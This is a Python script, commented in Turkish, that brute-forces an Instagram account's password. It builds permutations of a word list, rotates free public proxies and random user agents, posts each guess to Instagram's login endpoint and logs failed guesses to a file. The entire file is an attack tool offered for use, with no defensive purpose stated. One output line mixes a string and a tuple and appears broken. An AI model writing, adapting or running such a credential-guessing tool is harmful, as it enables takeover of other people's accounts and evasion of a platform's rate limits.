import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
from itertools import permutations
import random

username ="" #instagram kullanıcı ismi
word=[] # word list

def random_ua():
    ua = UserAgent()
    return {'User-Agent': ua.random}

def proxy():
    json_ip = requests.get("https://freevpn.ninja/free-proxy/json").json()
    "https://gimmeproxy.com/api/getProxy" # proxy siteleri
    "https://getproxylist.com/"
    num = random.randrange(10000)
    json_num = json_ip[num]
    if json_num["type"] == "https":
        ip = "https://"+json_num["proxy"]
        print(ip )
        return {"https":ip }
    elif json_num["type"] == "http":
        ip = "http://"+json_num["proxy"]
        print(ip )
        return {"http":ip }


class Instagram():
    def __init__(self,username,password):
        self.username = username
        self.password = password
        self.s = requests.Session()
        self.s.headers = random_ua()
        self.s.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
        self.s.headers.update({
			'UserAgent':random_ua()["User-Agent"],
			'x-instagram-ajax':'1',
			'X-Requested-With': 'XMLHttpRequest',
			'origin': 'https://www.instagram.com',
			'ContentType' : 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Referer': 'https://www.instagram.com/accounts/login/',
			'authority': 'www.instagram.com',
			'Host' : 'www.instagram.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})
        login_url = "https://www.instagram.com/accounts/login/"
        while True:
            try:
                self.s.proxies = proxy()
                s_get = self.s.get(login_url)
                break
            except:
                pass
        self.s.headers.update({'X-CSRFToken' : s_get.cookies.get_dict()['csrftoken']})
        self.soup=BeautifulSoup(s_get.content,"html.parser")
        self.post_url = "https://www.instagram.com/accounts/login/ajax/"

    def data(self):
        data={
        }
        data['username'] = self.username
        data['password'] = self.password
        return data

    def login(self,data):
        r = self.s.post(self.post_url, data=data)
        self.s.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
        data = json.loads(r.text)
        try:
            if data['authenticated'] == True:
                return True,{"data":data,"kullanıcı adı":self.username,"şifre":self.password}
        except KeyError:
            pass
        return False,{"data":data}

def hack_instagram(user,pass_):
    t = Instagram(user,pass_)
    data = t.data()
    login = t.login(data)
    return login

open("invalid_password-"+username+".txt","a").close()
with open("invalid_password-"+username+".txt") as invalid:
    invalid_password = invalid.read().splitlines()
save_pass = open("invalid_password-"+username+".txt","a")

for num in range(1,10):
    for per in permutations(word,num):
        per = str(per).replace(",","").replace(")","").replace("(","").replace("'","").replace(" ","")
        if per not in invalid_password:
            hack = hack_instagram(username,per)
            if hack[0] == False:
                print(per,file=save_pass,flush=True)
            else:
                print(per+hack,file=save_pass,flush=True)
            print(hack)

save_pass.close()
